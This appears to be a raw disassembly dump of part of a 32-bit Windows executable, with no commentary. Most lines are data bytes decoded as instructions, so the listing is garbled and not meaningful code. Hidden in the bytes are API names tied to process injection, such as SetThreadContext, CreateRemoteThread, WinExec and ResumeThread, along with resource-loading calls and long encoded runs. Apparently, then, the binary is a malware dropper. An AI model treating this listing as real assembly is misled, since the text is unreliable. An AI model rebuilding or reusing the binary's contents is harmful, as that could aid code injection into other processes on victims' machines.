  41369e:	xor    eax,0x74655304
  4136a3:	push   esp
  4136a4:	push   0x64616572
  4136a9:	inc    ecx
  4136aa:	data16 imul bp,WORD PTR [esi+0x69],0x7974
  4136b1:	dec    ebp
  4136b2:	popa   
  4136b3:	jae    0x413720
  4136b5:	add    BYTE PTR [esi],bl
  4136b7:	add    al,BYTE PTR [edi+0x65]
  4136ba:	je     0x41370c
  4136bc:	jb     0x413727
  4136be:	outs   dx,DWORD PTR ds:[esi]
  4136bf:	jb     0x41372a
  4136c1:	je     0x41373c
  4136c3:	inc    ebx
  4136c4:	ins    BYTE PTR es:[edi],dx
  4136c5:	popa   
  4136c6:	jae    0x41373b
  4136c8:	add    BYTE PTR [eax],al
  4136ca:	sti    
  4136cb:	add    DWORD PTR [edi+0x65],eax
  4136ce:	je     0x41371c
  4136d0:	popa   
  4136d1:	jae    0x413747
  4136d3:	inc    ebp
  4136d4:	jb     0x413748
  4136d6:	outs   dx,DWORD PTR ds:[esi]
  4136d7:	jb     0x4136d9
  4136d9:	add    BYTE PTR [edi],dl
  4136db:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  4136df:	imul   eax,DWORD PTR [esi+0x69],0x6c
  4136e3:	add    BYTE PTR gs:[eax],al
  4136e6:	retf   
  4136e7:	add    DWORD PTR [edi+0x65],eax
  4136ea:	je     0x41372f
  4136ec:	jne    0x413760
  4136ee:	jb     0x413755
  4136f0:	outs   dx,BYTE PTR ds:[esi]
  4136f1:	je     0x413737
  4136f3:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4136fa:	jns    0x413753
  4136fc:	add    BYTE PTR [eax],al
  4136fe:	mov    BYTE PTR [eax],al
  413700:	inc    ecx
  413701:	jb     0x413768
  413703:	inc    esi
  413704:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x41736970
  41370c:	dec    esi
  41370d:	push   ebx
  41370e:	dec    ecx
  41370f:	add    BYTE PTR ds:0x74655304,ah
  413715:	dec    ebp
  413716:	popa   
  413717:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x6e49746f
  41371f:	outs   dx,WORD PTR ds:[esi]
  413721:	add    dl,cl
  413723:	add    BYTE PTR [ebx+0x72],al
  413726:	gs popa 
  413728:	je     0x41378f
  41372a:	inc    ebp
  41372b:	jbe    0x413792
  41372d:	outs   dx,BYTE PTR ds:[esi]
  41372e:	je     0x413771
  413730:	add    BYTE PTR [eax],al
  413732:	outs   dx,BYTE PTR ds:[esi]
  413733:	add    DWORD PTR [esi+0x69],eax
  413736:	outs   dx,BYTE PTR ds:[esi]
  413737:	fs push edx
  413739:	gs jae 0x4137ab
  41373c:	jne    0x4137b0
  41373e:	arpl   WORD PTR [ebp+0x45],sp
  413741:	js     0x41379a
  413743:	add    BYTE PTR [eax+0x3],bh
  413746:	push   edx
  413747:	gs popa 
  413749:	fs inc esi
  41374b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x47026100
  413753:	gs je  0x4137aa
  413756:	gs ins DWORD PTR es:[edi],dx
  413758:	jo     0x4137aa
  41375a:	popa   
  41375b:	je     0x4137c5
  41375d:	inc    ecx
  41375e:	add    BYTE PTR [eax],al
  413760:	mov    DWORD PTR [edx],eax
  413762:	inc    edi
  413763:	ins    BYTE PTR es:[edi],dx
  413764:	outs   dx,DWORD PTR ds:[esi]
  413765:	bound  esp,QWORD PTR [ecx+0x6c]
  413768:	inc    ecx
  413769:	ins    BYTE PTR es:[edi],dx
  41376a:	ins    BYTE PTR es:[edi],dx
  41376b:	outs   dx,DWORD PTR ds:[esi]
  41376c:	arpl   WORD PTR [eax],ax
  41376e:	xchg   esp,eax
  41376f:	add    al,0x57
  413771:	imul   ebp,DWORD PTR [esi+0x45],0x636578
  413778:	bound  eax,QWORD PTR [edx]
  41377a:	inc    edi
  41377b:	gs je  0x4137d2
  41377e:	gs ins DWORD PTR es:[edi],dx
  413780:	jo     0x4137d2
  413782:	popa   
  413783:	je     0x4137ed
  413785:	push   edi
  413786:	add    BYTE PTR [eax],al
  413788:	rol    BYTE PTR [eax],1
  41378a:	inc    ebx
  41378b:	jb     0x4137f2
  41378d:	popa   
  41378e:	je     0x4137f5
  413790:	inc    esi
  413791:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x47026700
  413799:	gs je  0x4137f0
  41379c:	push   0x64616572
  4137a1:	dec    esp
  4137a2:	outs   dx,DWORD PTR ds:[esi]
  4137a3:	arpl   WORD PTR [ecx+0x6c],sp
  4137a6:	add    BYTE PTR gs:[eax],ah
  4137a9:	add    DWORD PTR [ebp+0x6e],eax
  4137ac:	jne    0x41381b
  4137ae:	push   edx
  4137af:	gs jae 0x413821
  4137b2:	jne    0x413826
  4137b4:	arpl   WORD PTR [ebp+0x4e],sp
  4137b7:	popa   
  4137b8:	ins    DWORD PTR es:[edi],dx
  4137b9:	gs jae 0x4137fd
  4137bc:	add    BYTE PTR [eax],al
  4137be:	repz add DWORD PTR [edi+0x65],eax
  4137c2:	je     0x41380a
  4137c4:	jne    0x413832
  4137c6:	ins    BYTE PTR es:[edi],dx
  4137c7:	push   eax
  4137c8:	popa   
  4137c9:	je     0x413833
  4137cb:	dec    esi
  4137cc:	popa   
  4137cd:	ins    DWORD PTR es:[edi],dx
  4137ce:	gs push edi
  4137d0:	add    BYTE PTR [eax],al
  4137d2:	push   eax
  4137d3:	add    DWORD PTR [esi+0x69],eax
  4137d6:	ins    BYTE PTR es:[edi],dx
  4137d7:	gs push esp
  4137d9:	imul   ebp,DWORD PTR [ebp+0x65],0x79536f54
  4137e0:	jae    0x413856
  4137e2:	gs ins DWORD PTR es:[edi],dx
  4137e4:	push   esp
  4137e5:	imul   ebp,DWORD PTR [ebp+0x65],0xe60000
  4137ec:	inc    ebx
  4137ed:	jb     0x413854
  4137ef:	popa   
  4137f0:	je     0x413857
  4137f2:	push   edx
  4137f3:	gs ins DWORD PTR es:[edi],dx
  4137f5:	outs   dx,DWORD PTR ds:[esi]
  4137f6:	je     0x41385d
  4137f8:	push   esp
  4137f9:	push   0x64616572
  4137fe:	add    BYTE PTR [eax],al
  413800:	jns    0x413804
  413802:	inc    edi
  413803:	gs je  0x41385c
  413806:	gs jb  0x41387c
  413809:	imul   ebp,DWORD PTR [edi+0x6e],0x1010000
  413810:	inc    esp
  413811:	gs ins BYTE PTR es:[edi],dx
  413813:	gs je  0x41387b
  413816:	inc    ebx
  413817:	jb     0x413882
  413819:	je     0x413884
  41381b:	arpl   WORD PTR [ecx+0x6c],sp
  41381e:	push   ebx
  41381f:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  413824:	outs   dx,BYTE PTR ds:[esi]
  413825:	add    BYTE PTR [ecx],cl
  413827:	add    al,BYTE PTR [edi+0x65]
  41382a:	je     0x413879
  41382c:	outs   dx,DWORD PTR ds:[esi]
  41382d:	fs jne 0x41389c
  413830:	gs inc esi
  413832:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  41383a:	add    BYTE PTR [eax],al
  41383c:	dec    edi
  41383d:	add    al,0x53
  41383f:	jne    0x4138b4
  413841:	jo     0x4138a8
  413843:	outs   dx,BYTE PTR ds:[esi]
  413844:	fs push esp
  413846:	push   0x64616572
  41384b:	add    ah,cl
  41384d:	add    al,0x6c
  41384f:	jae    0x4138c5
  413851:	jb     0x4138b6
  413853:	jo     0x4138ce
  413855:	outs   dx,BYTE PTR ds:[esi]
  413856:	push   edi
  413857:	add    bh,dh
  413859:	add    DWORD PTR [edi+0x65],eax
  41385c:	je     0x4138a6
  41385e:	popa   
  41385f:	outs   dx,BYTE PTR ds:[esi]
  413860:	fs ins BYTE PTR es:[edi],dx
  413862:	gs dec ecx
  413864:	outs   dx,BYTE PTR ds:[esi]
  413865:	outs   dx,WORD PTR ds:[esi]
  413867:	jb     0x4138d6
  413869:	popa   
  41386a:	je     0x4138d5
  41386c:	outs   dx,DWORD PTR ds:[esi]
  41386d:	outs   dx,BYTE PTR ds:[esi]
  41386e:	add    BYTE PTR [eax],al
  413870:	or     eax,DWORD PTR [ebx]
  413872:	dec    esp
  413873:	outs   dx,DWORD PTR ds:[esi]
  413874:	arpl   WORD PTR [ecx+0x6c],sp
  413877:	inc    ecx
  413878:	ins    BYTE PTR es:[edi],dx
  413879:	ins    BYTE PTR es:[edi],dx
  41387a:	outs   dx,DWORD PTR ds:[esi]
  41387b:	arpl   WORD PTR [eax],ax
  41387d:	add    BYTE PTR [ebx+0x2],ah
  413880:	inc    edi
  413881:	gs je  0x4138d8
  413884:	push   0x64616572
  413889:	inc    ebx
  41388a:	outs   dx,DWORD PTR ds:[esi]
  41388b:	outs   dx,BYTE PTR ds:[esi]
  41388c:	je     0x4138f3
  41388e:	js     0x413904
  413890:	add    BYTE PTR [eax],al
  413892:	ret    
  413893:	add    edx,DWORD PTR [edx+0x74]
  413896:	ins    BYTE PTR es:[edi],dx
  413897:	push   ebp
  413898:	outs   dx,BYTE PTR ds:[esi]
  413899:	ja     0x413904
  41389b:	outs   dx,BYTE PTR ds:[esi]
  41389c:	add    BYTE PTR fs:[ecx+eax*1+0x41746547],cl
  4138a4:	je     0x413915
  4138a6:	ins    DWORD PTR es:[edi],dx
  4138a7:	dec    esi
  4138a8:	popa   
  4138a9:	ins    DWORD PTR es:[edi],dx
  4138aa:	gs push edi
  4138ac:	add    BYTE PTR [eax],al
  4138ae:	jmp    0x6946:0x74654701
  4138b5:	ins    BYTE PTR es:[edi],dx
  4138b6:	gs inc ecx
  4138b8:	je     0x41392e
  4138ba:	jb     0x413925
  4138bc:	bound  esi,QWORD PTR [ebp+0x74]
  4138bf:	gs jae 0x413907
  4138c2:	js     0x413905
  4138c4:	add    BYTE PTR [eax],al
  4138c6:	inc    edx
  4138c7:	add    al,BYTE PTR [edi+0x65]
  4138ca:	je     0x41391f
  4138cc:	push   0x5074726f
  4138d1:	popa   
  4138d2:	je     0x41393c
  4138d4:	dec    esi
  4138d5:	popa   
  4138d6:	ins    DWORD PTR es:[edi],dx
  4138d7:	gs inc ecx
  4138d9:	add    bl,bl
  4138db:	add    edx,DWORD PTR [ebx+0x65]
  4138de:	popa   
  4138df:	jb     0x413944
  4138e1:	push   0x68746150
  4138e6:	inc    ecx
  4138e7:	add    BYTE PTR [eax+0x4],al
  4138ea:	push   ebx
  4138eb:	gs je  0x413942
  4138ee:	imul   ebp,DWORD PTR [ebp+0x65],0x65755172
  4138f5:	jne    0x41395c
  4138f7:	push   esp
  4138f8:	imul   ebp,DWORD PTR [ebp+0x65],0xb4000072
  4138ff:	add    edx,DWORD PTR [edx+0x65]
  413902:	ins    DWORD PTR es:[edi],dx
  413903:	outs   dx,DWORD PTR ds:[esi]
  413904:	jbe    0x41396b
  413906:	inc    esp
  413907:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  41390e:	jns    0x413967
  413910:	add    BYTE PTR [eax],al
  413912:	ret    
  413913:	add    al,0x6c
  413915:	jae    0x41398b
  413917:	jb     0x41397c
  413919:	ins    DWORD PTR es:[edi],dx
  41391a:	jo     0x413973
  41391c:	add    BYTE PTR [eax],al
  41391e:	dec    edi
  41391f:	add    DWORD PTR [esi+0x69],eax
  413922:	ins    BYTE PTR es:[edi],dx
  413923:	gs push esp
  413925:	imul   ebp,DWORD PTR [ebp+0x65],0x6f4c6f54
  41392c:	arpl   WORD PTR [ecx+0x6c],sp
  41392f:	inc    esi
  413930:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656d69
  413938:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413939:	add    BYTE PTR [ebx+0x61],al
  41393c:	outs   dx,BYTE PTR ds:[esi]
  41393d:	arpl   WORD PTR [ebp+0x6c],sp
  413940:	push   edi
  413941:	popa   
  413942:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  41394a:	ins    DWORD PTR es:[edi],dx
  41394b:	gs jb  0x41394e
  41394e:	dec    ebx
  41394f:	inc    ebp
  413950:	push   edx
  413951:	dec    esi
  413952:	inc    ebp
  413953:	dec    esp
  413954:	xor    esi,DWORD PTR [edx]
  413956:	cs fs ins BYTE PTR es:[edi],dx
  413959:	ins    BYTE PTR es:[edi],dx
  41395a:	add    BYTE PTR [eax],al
  41395c:	inc    esi
  41395d:	add    BYTE PTR [eax+0x61],dl
  413960:	je     0x4139ca
  413962:	inc    esi
  413963:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  41396a:	outs   dx,BYTE PTR ds:[esi]
  41396b:	jae    0x4139d6
  41396d:	outs   dx,DWORD PTR ds:[esi]
  41396e:	outs   dx,BYTE PTR ds:[esi]
  41396f:	inc    ecx
  413970:	add    BYTE PTR [eax],al
  413972:	inc    edi
  413973:	add    BYTE PTR [eax+0x61],dl
  413976:	je     0x4139e0
  413978:	inc    esi
  413979:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  413980:	outs   dx,BYTE PTR ds:[esi]
  413981:	jae    0x4139ec
  413983:	outs   dx,DWORD PTR ds:[esi]
  413984:	outs   dx,BYTE PTR ds:[esi]
  413985:	push   edi
  413986:	add    BYTE PTR [eax],al
  413988:	push   ebx
  413989:	dec    eax
  41398a:	dec    esp
  41398b:	push   edi
  41398c:	inc    ecx
  41398d:	push   eax
  41398e:	dec    ecx
  41398f:	cs fs ins BYTE PTR es:[edi],dx
  413992:	ins    BYTE PTR es:[edi],dx
  413993:	add    BYTE PTR [ebx+0x46],dh
  413996:	addr16 popa 
  413998:	pop    ecx
  413999:	dec    ebp
  41399a:	popa   
  41399b:	jns    0x4139f1
  41399d:	push   ecx
  41399e:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  4139a2:	je     0x413a05
  4139a4:	inc    ebx
  4139a5:	push   ecx
  4139a6:	ins    BYTE PTR es:[edi],dx
  4139a7:	pop    eax
  4139a8:	add    BYTE PTR [eax],al
  4139aa:	add    BYTE PTR [eax],al
  4139ac:	or     al,0x3e
  4139ae:	inc    ecx
  4139af:	add    BYTE PTR [esi+edi*1],dl
  4139b2:	inc    ecx
  4139b3:	add    ah,dh
  4139b5:	cmp    eax,DWORD PTR [ecx+0x0]
  4139b8:	call   0x794febc8
  4139bd:	dec    edi
  4139be:	ret    0x774e
  4139c1:	dec    edi
  4139c2:	cmp    eax,0x384f4f4f
  4139c7:	dec    edi
  4139c8:	jp     0x413a19
  4139ca:	cmp    ecx,DWORD PTR [edi+0x5e]
  4139cd:	dec    edi
  4139ce:	ss dec edi
  4139d0:	add    ecx,DWORD PTR [edi+0x31]
  4139d3:	dec    edi
  4139d4:	ret    0x324e
  4139d7:	dec    edi
  4139d8:	push   ds
  4139d9:	push   edx
  4139da:	pop    ds
  4139db:	push   ebx
  4139dc:	cmp    DWORD PTR [edi+0x79],ecx
  4139df:	dec    edi
  4139e0:	ret    0x774e
  4139e3:	dec    edi
  4139e4:	cmp    eax,0x384f4f4f
  4139e9:	dec    edi
  4139ea:	jp     0x413a3b
  4139ec:	cmp    ecx,DWORD PTR [edi+0x5e]
  4139ef:	dec    edi
  4139f0:	ss dec edi
  4139f2:	imul   ecx,DWORD PTR [edi+0x31],0x324ec24f
  4139f9:	dec    edi
  4139fa:	push   ds
  4139fb:	bound  ebx,QWORD PTR [edi]
  4139fd:	arpl   WORD PTR [ecx],di
  4139ff:	dec    edi
  413a00:	jns    0x413a51
  413a02:	ret    0x724e
  413a05:	dec    edi
  413a06:	cmp    eax,0x394f034f
  413a0b:	dec    edi
  413a0c:	dec    esp
  413a0d:	dec    edi
  413a0e:	xor    al,0x4f
  413a10:	ret    0x304e
  413a13:	dec    edi
  413a14:	push   ds
  413a15:	jb     0x413a36
  413a17:	jae    0x413a28
  413a19:	or     DWORD PTR [eax],0xffffff80
  413a1c:	js     0x4139ae
  413a1e:	jns    0x4139b1
  413a20:	aas    
  413a21:	dec    edi
  413a22:	jbe    0x413a73
  413a24:	ret    0x764e
  413a27:	dec    edi
  413a28:	ds dec edi
  413a2a:	dec    esp
  413a2b:	dec    edi
  413a2c:	cmp    DWORD PTR [edi+0x3],ecx
  413a2f:	dec    edi
  413a30:	xor    eax,0x364ec24f
  413a35:	dec    edi
  413a36:	push   ds
  413a37:	sbb    BYTE PTR [edi],0x83
  413a3a:	setae  BYTE PTR [eax]
  413a3d:	nop
  413a3e:	js     0x4139e0
  413a40:	jns    0x4139e3
  413a42:	aas    
  413a43:	dec    edi
  413a44:	jbe    0x413a95
  413a46:	ret    0x764e
  413a49:	dec    edi
  413a4a:	ds dec edi
  413a4c:	dec    esp
  413a4d:	dec    edi
  413a4e:	cmp    DWORD PTR [edi+0x69],ecx
  413a51:	dec    edi
  413a52:	xor    eax,0x364ec24f
  413a57:	dec    edi
  413a58:	push   ds
  413a59:	xchg   edx,eax
  413a5a:	pop    ds
  413a5b:	xchg   ebx,eax
  413a5c:	bt     DWORD PTR [eax],ecx
  413a5f:	mov    al,ds:0xb179b078
  413a64:	aas    
  413a65:	dec    edi
  413a66:	push   0x4e4ec24f
  413a6b:	dec    edi
  413a6c:	cmp    eax,0x394f034f
  413a71:	dec    edi
  413a72:	push   ecx
  413a73:	dec    edi
  413a74:	xor    al,0x4f
  413a76:	ret    0x364e
  413a79:	dec    edi
  413a7a:	push   ds
  413a7b:	mov    ds:0xb30fa31f,al
  413a80:	or     BYTE PTR [eax-0x3e863f88],dh
  413a86:	aas    
  413a87:	dec    edi
  413a88:	push   0x4e4ec24f
  413a8d:	dec    edi
  413a8e:	cmp    eax,0x394f784f
  413a93:	dec    edi
  413a94:	pop    edi
  413a95:	dec    edi
  413a96:	cmp    ecx,DWORD PTR [edi-0x3e]
  413a99:	dec    esi
  413a9a:	xor    eax,0x1fb21e4f
  413a9f:	mov    bl,0xf
  413aa1:	ret    
  413aa2:	or     al,al
  413aa4:	js     0x413a76
  413aa6:	jns    0x413a79
  413aa8:	aas    
  413aa9:	dec    edi
  413aaa:	push   0x4e4ec24f
  413aaf:	dec    edi
  413ab0:	cmp    eax,0x394f724f
  413ab5:	dec    edi
  413ab6:	dec    esi
  413ab7:	dec    edi
  413ab8:	xor    al,0x4f
  413aba:	ret    0x304e
  413abd:	dec    edi
  413abe:	push   ds
  413abf:	ret    0xc31f
  413ac2:	psrlq  mm1,QWORD PTR [eax]
  413ac5:	sar    BYTE PTR [eax-0x20],1
  413ac8:	jns    0x413aab
  413aca:	aas    
  413acb:	dec    edi
  413acc:	push   0x4e4ec24f
  413ad1:	dec    edi
  413ad2:	cmp    eax,0x394f734f
  413ad7:	dec    edi
  413ad8:	dec    esp
  413ad9:	dec    edi
  413ada:	xor    al,0x4f
  413adc:	ret    0x364e
  413adf:	dec    edi
  413ae0:	push   ds
  413ae1:	rcr    BYTE PTR [edi],cl
  413ae3:	ror    DWORD PTR [edi],cl
  413ae5:	jecxz  0x413aef
  413ae7:	loopne 0x413b61
  413ae9:	lock jns 0x413add
  413aec:	aas    
  413aed:	dec    edi
  413aee:	ins    DWORD PTR es:[edi],dx
  413aef:	dec    edi
  413af0:	ret    0x5f4e
  413af3:	dec    edi
  413af4:	cmp    eax,0x3e4f524f
  413af9:	dec    edi
  413afa:	ret    0x3f4e
  413afd:	dec    edi
  413afe:	push   ds
  413aff:	loop   0x413b20
  413b01:	jecxz  0x413b12
  413b03:	repz or al,dh
  413b06:	js     0x413b08
  413b08:	jns    0x413b0b
  413b0a:	js     0x413b1c
  413b0c:	jns    0x413b1f
  413b0e:	ds dec edi
  413b10:	jg     0x413b61
  413b12:	ret    0x5b4e
  413b15:	dec    edi
  413b16:	cmp    al,0x4f
  413b18:	jb     0x413b69
  413b1a:	ds dec edi
  413b1c:	dec    ebp
  413b1d:	dec    edi
  413b1e:	cmp    ecx,DWORD PTR [edi-0x3e]
  413b21:	dec    esi
  413b22:	xor    eax,0x1f021e4f
  413b27:	add    ecx,DWORD PTR [edi]
  413b29:	adc    ecx,DWORD PTR [eax]
  413b2b:	adc    BYTE PTR [eax+0x20],bh
  413b2e:	jns    0x413b51
  413b30:	aas    
  413b31:	dec    edi
  413b32:	add    BYTE PTR [eax],al
  413b34:	mov    esp,0xb0004139
  413b39:	cmp    eax,DWORD PTR [ecx+0x0]
  413b3c:	mov    eax,0x1800413b
  413b41:	ds inc ecx
  413b43:	add    BYTE PTR [ebp+edi*1+0x41],bh
  413b47:	add    BYTE PTR [eax],cl
  413b49:	ds inc ecx
  413b4b:	add    BYTE PTR [eax-0x63ffbec5],bl
  413b51:	cmp    eax,DWORD PTR [ecx+0x0]
  413b54:	add    BYTE PTR [esi],bh
  413b56:	inc    ecx
  413b57:	add    BYTE PTR [eax],al
  413b59:	cmp    al,0x41
  413b5b:	add    BYTE PTR [edx-0x4e076357],cl
  413b61:	mov    edx,0x3bb4f89c
  413b66:	inc    ecx
  413b67:	add    BYTE PTR [eax],bh
  413b69:	cmp    eax,0x3d4c0041
  413b6e:	inc    ecx
  413b6f:	add    BYTE PTR [eax+0x3d],bl
  413b72:	inc    ecx
  413b73:	add    BYTE PTR [eax+0x3d],ch
  413b76:	inc    ecx
  413b77:	add    ah,ch
  413b79:	cmp    eax,DWORD PTR [ecx+0x0]
  413b7c:	mov    eax,0xc004139
  413b81:	cmp    al,0x41
  413b83:	add    ah,bh
  413b85:	cmp    eax,DWORD PTR [ecx+0x0]
  413b88:	sbb    al,0x3e
  413b8a:	inc    ecx
  413b8b:	add    BYTE PTR [ecx],dh
  413b8d:	test   DWORD PTR [eax+edi*8-0x7ee8f462],ebx
  413b94:	sar    BYTE PTR [ebx],0x41
  413b97:	add    BYTE PTR [ebx-0x707ee9e4],dl
  413b9d:	or     eax,0x705
  413ba2:	inc    eax
  413ba3:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  413ba7:	fnsave [edi+0x37]
  413baa:	inc    ebx
  413bab:	add    BYTE PTR [edx+0x68],dh
  413bae:	inc    ebp
  413baf:	inc    ecx
  413bb0:	(bad)  
  413bb1:	cli    
  413bb2:	jne    0x413c16
  413bb4:	(bad)  
  413bb5:	in     eax,dx
  413bb6:	inc    BYTE PTR [edi]
  413bb8:	mov    eax,0xa805a3fa
  413bbd:	cmp    eax,DWORD PTR [ecx+0x0]
  413bc0:	xor    dl,BYTE PTR [ebp-0x69cd0764]
  413bc6:	pushf  
  413bc7:	clc    
  413bc8:	xor    edx,DWORD PTR [ebp-0x6ac30764]
  413bce:	pushf  
  413bcf:	clc    
  413bd0:	cmp    eax,0x3ef89c95
  413bd5:	xchg   ebp,eax
  413bd6:	pushf  
  413bd7:	clc    
  413bd8:	aas    
  413bd9:	xchg   ebp,eax
  413bda:	pushf  
  413bdb:	clc    
  413bdc:	cmp    BYTE PTR [ebp-0x6ac60764],dl
  413be2:	pushf  
  413be3:	clc    
  413be4:	cmp    dl,BYTE PTR [ebp-0x6ade0764]
  413bea:	pushf  
  413beb:	clc    
  413bec:	in     eax,dx
  413bed:	stc    
  413bee:	add    esp,DWORD PTR [eax-0x50]
  413bf1:	cmp    DWORD PTR [ecx+0x0],eax
  413bf4:	hlt    
  413bf5:	add    DWORD PTR [ebx+0x0],eax
  413bf8:	pop    ecx
  413bf9:	dec    ecx
  413bfa:	imul   si,WORD PTR [ecx],0xff85
  413bfe:	pushf  
  413bff:	clc    
  413c00:	sahf   
  413c01:	jmp    0x4f04356
  413c06:	add    BYTE PTR [eax],al
  413c08:	lods   al,BYTE PTR ds:[esi]
  413c09:	cmp    DWORD PTR [ecx+0x0],eax
  413c0c:	pushf  
  413c0d:	or     eax,DWORD PTR [esi+ecx*1]
	...
  413c40:	addr16 jg 0x413c83
  413c43:	add    BYTE PTR [edx+0x12],ch
  413c46:	inc    ebx
  413c47:	add    BYTE PTR [eax],al
  413c49:	add    BYTE PTR [eax],al
  413c4b:	add    BYTE PTR [eax+eax*1+0x46],al
  413c4f:	add    BYTE PTR [ecx+0x0],ch
  413c52:	outs   dx,DWORD PTR ds:[esi]
  413c53:	add    BYTE PTR [edx+0x0],cl
  413c56:	dec    ecx
  413c57:	add    BYTE PTR [eax+eax*1+0x46],al
  413c5b:	add    BYTE PTR [eax+eax*1+0x49],cl
  413c5f:	add    BYTE PTR [ebp+0x0],dl
  413c62:	inc    esi
  413c63:	add    BYTE PTR [edi+0x0],cl
  413c66:	imul   eax,DWORD PTR [eax],0x6f
  413c69:	add    BYTE PTR [edx+0x0],ch
  413c6c:	dec    ebx
  413c6d:	add    BYTE PTR [eax+eax*1+0x66],cl
  413c71:	add    BYTE PTR [edx+0x0],ch
  413c74:	imul   eax,DWORD PTR [eax],0x46006f
  413c7a:	jo     0x413c7c
  413c7c:	outs   dx,DWORD PTR ds:[esi]
  413c7d:	add    BYTE PTR [ebx+0x0],ch
  413c80:	ins    DWORD PTR es:[edi],dx
  413c81:	add    BYTE PTR [eax+eax*1+0x6b],ah
  413c85:	add    BYTE PTR [ebx+0x0],dh
  413c88:	ins    BYTE PTR es:[edi],dx
  413c89:	add    BYTE PTR [edx+0x0],ch
  413c8c:	data16 add BYTE PTR [edi+0x0],ah
  413c90:	imul   eax,DWORD PTR [eax],0x64006f
  413c96:	add    BYTE PTR [di+0x0],dh
  413c9a:	imul   eax,DWORD PTR [eax],0x69006a
  413ca0:	outs   dx,DWORD PTR ds:[esi]
  413ca1:	add    BYTE PTR [esi+0x0],ah
  413ca4:	add    BYTE PTR fs:[ebp+0x0],dh
  413ca8:	push   0x0
  413caa:	add    BYTE PTR [bp+0x0],ah
  413cae:	add    BYTE PTR fs:[eax],al
  413cb1:	add    BYTE PTR [eax],al
  413cb3:	add    BYTE PTR [edx+0x0],cl
  413cb6:	inc    esp
  413cb7:	add    BYTE PTR [ebx+0x0],cl
  413cba:	dec    edx
  413cbb:	add    BYTE PTR [edx+0x0],ch
  413cbe:	imul   eax,DWORD PTR [eax],0x64
  413cc1:	add    BYTE PTR [ebx+0x0],cl
  413cc4:	dec    esp
  413cc5:	add    BYTE PTR [edx+0x0],cl
  413cc8:	add    BYTE PTR fs:[ecx+0x0],ch
  413ccc:	ins    BYTE PTR es:[edi],dx
  413ccd:	add    BYTE PTR [edx+0x0],cl
  413cd0:	ins    BYTE PTR es:[edi],dx
  413cd1:	add    BYTE PTR [ebx+0x0],ch
  413cd4:	add    BYTE PTR fs:[edx+0x0],ch
  413cd8:	dec    esp
  413cd9:	add    BYTE PTR [ebp+0x0],dl
  413cdc:	inc    esp
  413cdd:	add    BYTE PTR [edi+0x0],ch
  413ce0:	imul   eax,DWORD PTR [eax],0x73006c
  413ce6:	push   0x0
  413ce8:	add    BYTE PTR fs:[ebx+0x0],ch
  413cec:	imul   eax,DWORD PTR [eax],0x6a
  413cef:	add    BYTE PTR [esi+0x0],ah
  413cf2:	add    BYTE PTR fs:[ebx+0x0],dh
  413cf6:	imul   eax,DWORD PTR [eax],0x6a
  413cf9:	add    BYTE PTR [esi+0x0],ah
  413cfc:	imul   eax,DWORD PTR [eax],0x64
  413cff:	add    BYTE PTR [ebx+0x0],dh
  413d02:	add    BYTE PTR [eax],al
  413d04:	dec    edx
  413d05:	inc    esp
  413d06:	dec    ebx
  413d07:	dec    edx
  413d08:	push   0x6b
  413d0a:	fs dec ebx
  413d0c:	dec    esp
  413d0d:	dec    edx
  413d0e:	imul   ebp,DWORD PTR fs:[edx+ecx*2+0x6c],0x4c6a646b
  413d17:	push   ebp
  413d18:	inc    esp
  413d19:	outs   dx,DWORD PTR ds:[esi]
  413d1a:	imul   ebp,DWORD PTR [ebx+esi*2+0x6a],0x6a6b6b64
  413d22:	data16 fs jae 0x413d91
  413d26:	push   0x66
  413d28:	imul   esp,DWORD PTR [ebx+esi*2+0x0],0x0
  413d2d:	add    BYTE PTR [eax],al
  413d2f:	add    BYTE PTR [eax],al
  413d31:	add    BYTE PTR [eax],al
  413d33:	add    BYTE PTR [ebp-0x68],cl
  413d36:	inc    eax
  413d37:	add    BYTE PTR [ebp+0x4f],dl
  413d3a:	pop    edi
  413d3b:	dec    edi
  413d3c:	dec    esp
  413d3d:	dec    edi
  413d3e:	push   eax
  413d3f:	dec    edi
  413d40:	pop    edi
  413d41:	dec    edi
  413d42:	push   esi
  413d43:	dec    edi
  413d44:	or     eax,0xc24f0c4f
  413d49:	dec    esi
  413d4a:	add    BYTE PTR [eax],al
  413d4c:	pop    ecx
  413d4d:	dec    edi
  413d4e:	pop    esi
  413d4f:	dec    edi
  413d50:	pop    ebx
  413d51:	dec    edi
  413d52:	or     eax,0xc24f0c4f
  413d57:	dec    esi
  413d58:	dec    edi
  413d59:	dec    edi
  413d5a:	dec    ebp
  413d5b:	dec    edi
  413d5c:	pop    edi
  413d5d:	dec    edi
  413d5e:	dec    esp
  413d5f:	dec    edi
  413d60:	or     eax,0xc24f0c4f
  413d65:	dec    esi
  413d66:	add    BYTE PTR [eax],al
  413d68:	dec    ebp
  413d69:	dec    edi
  413d6a:	pop    edx
  413d6b:	dec    edi
  413d6c:	push   esi
  413d6d:	dec    edi
  413d6e:	dec    ecx
  413d6f:	dec    edi
  413d70:	arpl   WORD PTR [edi+0x52],cx
  413d73:	dec    edi
  413d74:	pop    ebx
  413d75:	dec    edi
  413d76:	ret    0x4e
  413d79:	add    BYTE PTR [eax],al
  413d7b:	add    BYTE PTR [esi+0x7d],ch
  413d7e:	outs   dx,BYTE PTR ds:[esi]
  413d7f:	lea    ebp,[esi-0x63]
  413d82:	outs   dx,BYTE PTR ds:[esi]
  413d83:	lods   eax,DWORD PTR ds:[esi]
  413d84:	outs   dx,BYTE PTR ds:[esi]
  413d85:	mov    ebp,0xdd6ecd6e
  413d8a:	outs   dx,BYTE PTR ds:[esi]
  413d8b:	in     eax,dx
  413d8c:	outs   dx,BYTE PTR ds:[esi]
  413d8d:	std    
  413d8e:	outs   dx,BYTE PTR ds:[esi]
